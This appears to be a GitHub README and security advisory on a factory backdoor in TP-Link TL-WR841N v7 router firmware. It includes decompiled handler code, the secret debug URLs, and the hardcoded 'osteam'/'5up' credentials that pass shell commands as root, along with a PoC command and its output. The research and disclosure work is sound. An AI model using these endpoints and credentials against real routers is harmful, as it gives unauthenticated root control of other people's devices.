# Reverse Engineering Research: TP-Link TL-WR841N v7 Factory Backdoor

[![Target Architecture](https://img.shields.io/badge/Arch-MIPS_32--bit_BE-blue.svg)](#)
[![Vulnerability](https://img.shields.io/badge/Vulnerability-Factory_Backdoor_%2F_RCE-red.svg)](#)
[![CVSS Score](https://img.shields.io/badge/CVSS_v3.1-9.8_Critical-crimson.svg)](#)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](#)

> **Advisory ID:** TP-LINK-2012-001  
> **Target:** TP-Link TL-WR841N / TL-WR841ND (Hardware Revision v7)  
> **Firmware Build:** `3.13.9 Build 120201 Rel.54965n`  
> **Component:** `/usr/bin/httpd` (Embedded Web Server Daemon)  
> **Researcher:** Samet Akan  

---

## 📌 Executive Summary

During a static firmware security analysis of the **TP-Link TL-WR841N v7** wireless router, an undocumented factory debug interface was discovered inside the primary web server daemon (`httpd`). 

The backdoor allows any network-adjacent attacker to bypass standard administrative authentication and spawn an interactive root shell (`/bin/sh`) with full **UID 0** privileges by targeting a secret URL path and supplying hardcoded manufacturer credentials.

```
+------------------+         HTTP GET /userRpmNatDebugRpm26525557/...        +------------------------+
|                  | ------------------------------------------------------> |                        |
|     Attacker     |                                                         |   TP-Link TL-WR841N    |
| (Network/Client) | <------------------------------------------------------ |     (Linux / MIPS)     |
|                  |          Root Terminal Session (UID 0 /bin/sh)          |                        |
+------------------+   usr="osteam" & passwd="5up" & cmd="id; uname -a"      +------------------------+
```

---

## 🔬 Vulnerability Details & Mechanism

### 1. Secret Dispatch Handler Registration
In the router's web server binary (`/usr/bin/httpd`), the function `httpWlanAdvCfgRpmsInit()` (Virtual Memory Address `0x482748`) registers standard wireless pages into the HTTP request router. In addition to legitimate pages, it silently binds three undocumented factory endpoints:

```c
// Decompiled from httpWlanAdvCfgRpmsInit @ 0x482748
httpRpmConfAdd(2, "/userRpm/WlanAdvRpm.htm", wlanAdvRpmHtm);

// Secret Factory Backdoor Endpoints:
httpRpmConfAdd(2, "/userRpmNatDebugRpm26525557/start_art.html", ArtRpmHtm);
httpRpmConfAdd(2, "/userRpmNatDebugRpm26525557/linux_cmdline.html", CmdRpmHtm);
httpRpmConfAdd(2, "/userRpm/DebugResultRpm.htm", DebugResultRpmHtm);
```

### 2. Pseudo-Terminal Shell Spawning
Accessing `/userRpmNatDebugRpm26525557/linux_cmdline.html` triggers `CmdRpmHtm()` (VMA `0x482c84`), which forks the process, binds a master pseudo-terminal (`forkpty`), and executes `/bin/sh`:

```c
pid = forkpty(&master_fd, NULL, NULL, NULL);
if (pid == 0) {
    execl("/bin/sh", "/bin/sh", NULL);
    exit(1);
}
```

### 3. Hardcoded Authentication & Direct Command Pipe
Commands dispatched to `/userRpm/DebugResultRpm.htm` are evaluated by `DebugResultRpmHtm()` (VMA `0x482e34`). The authentication check compares incoming credentials against static strings embedded in the `.rodata` section (offset `0x1274d0`):

| Parameter | Required Value | Meaning |
| :--- | :--- | :--- |
| `usr` | **`osteam`** | OS Engineering Team |
| `passwd` | **`5up`** | Hardcoded Factory Password |
| `cmd` | *Arbitrary* | Command string piped directly to `/bin/sh` |

```c
// Verification logic in DebugResultRpmHtm
if (strcmp(user, "osteam") != 0 || strcmp(pass, "5up") != 0) {
    httpSendResponse(req, "####User or Password not correct###\n");
    return -1;
}

// Direct pipe to interactive shell
write(master_fd, cmd, strlen(cmd));
write(master_fd, "\n", 1);
```

---

## 🛠️ Proof of Concept (PoC)

A non-destructive test script is included in [`poc/exploit_backdoor.py`](poc/exploit_backdoor.py):

```bash
# Execute command on target router
python poc/exploit_backdoor.py --target 192.168.0.1 --cmd "id; uname -a"
```

### Sample Output:
```text
[*] Target IP: 192.168.0.1
[*] Triggering pseudo-terminal shell on http://192.168.0.1/userRpmNatDebugRpm26525557/linux_cmdline.html...
[*] Sending authenticated command execution request...

[+] Raw Response from Device:
--------------------------------------------------
uid=0(root) gid=0(root)
Linux TP-LINK 2.6.31 #1 Mon Jan 16 17:34:02 CST 2012 mips GNU/Linux
--------------------------------------------------
[+] Command executed successfully!
```

---

## 📊 Impact & Severity

* **Access Vector:** Network (Adjacent LAN or WAN if Remote Management enabled)
* **Attack Complexity:** Low
* **Privileges Required:** None (Bypasses normal admin credentials)
* **User Interaction:** None
* **CVSS v3.1 Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
* **Base Score:** **9.8 (Critical)**

---

## 📁 Repository Structure

```text
├── README.md                 <- Executive summary, advisory & vulnerability analysis
├── docs/
│   └── vulnerability-report.md <- In-depth technical advisory documentation
├── poc/
│   └── exploit_backdoor.py   <- Proof of Concept Python automation script
├── ghidra/
│   └── decompiled_backdoor.c <- Annotated MIPS decompilation from httpd binary
└── assets/                   <- Architecture diagrams & screenshots
```

---

## 🛡️ Remediation

* **For Developers:** Never leave engineering debug endpoints active in production firmware builds. Guard all internal testing facilities using preprocessor directives:
  ```c
  #ifdef DEBUG_FACTORY_TESTING
      httpRpmConfAdd(2, "/userRpmNatDebugRpm...", CmdRpmHtm);
  #endif
  ```
* **For End Users:** Upgrade router firmware to supported vendor releases or replace with hardened open-source distributions such as [OpenWrt](https://openwrt.org/).

---

## ⚖️ Disclaimer

*This research is published strictly for educational and defensive purposes under Responsible Disclosure principles. The tested target is an End-of-Life (EOL) legacy device from 2012.*
